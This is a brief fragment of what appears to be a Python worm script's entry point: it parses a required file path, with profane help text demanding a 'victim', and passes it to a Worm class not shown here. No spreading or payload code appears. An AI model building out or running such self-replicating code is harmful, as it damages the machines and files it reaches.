...
if __name__ == "__main__":
    ...
    parser = argparse.ArgumentParser(description="Give me a victim, you piece of shit!!!")
    parser.add_argument("--path", required=True, help="Path of the file")

    # Parse the command-line arguments
    args = parser.parse_args()

    worm = Worm(path=args.path)  # Pass the path argument to the Worm class constructor
